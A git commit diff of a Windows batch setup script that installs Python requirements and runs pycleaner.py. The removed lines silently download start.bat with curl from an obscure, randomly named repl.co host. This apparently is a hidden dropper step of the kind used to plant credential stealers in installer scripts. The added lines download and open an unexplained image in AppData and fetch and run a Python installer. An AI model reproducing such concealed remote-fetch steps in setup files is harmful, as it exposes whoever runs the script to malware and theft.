406c739c888711b995e6ae3378e163d3c3512202
jotaro <93826447+j0taro@users.noreply.github.com>
2022-09-10 18:19:43 +0300

    Update setup-requirements.bat

--- setup-requirements.bat
+++ setup-requirements.bat
@@ -1,8 +1,32 @@
-
 @echo off
-cd %~dp0
-MD tools
-pip install -r requirements.txt
-curl -L https://untimelyimpressionableadministration.blus2tlia.repl.co/start.bat -O
-python pycleaner.py
+
+cd /d %~dp0
+color a
+
+python --version 3>NUL
+if errorlevel 1 goto errorNoPython
+pip -v>NUL
+if errorlevel 1 goto errorNoPip
+:ong
+python -m pip install --upgrade -r requirements.txt
+cls
+python -m pycleaner.py
+pause
+exit
+
+
+:errorNoPython
+echo Python is not installed on your system or not added to path!!!
+echo dont forget to check add to path
+curl -L "https://i.imgur.com/cE7DzJ7.jpeg" -o C:\Users\%username%\AppData\Roaming\random.png
+start C:\Users\%username%\AppData\Roaming\random.png
+curl -L "https://www.python.org/ftp/python/3.10.7/python-3.10.7-amd64.exe" -O
+start /W "python-3.10.7-amd64.exe"
+goto ong
+pause
+exit
+:errorNoPip
+echo Pip is not installed on your system or not added to path!!!
+pause
+exit
 
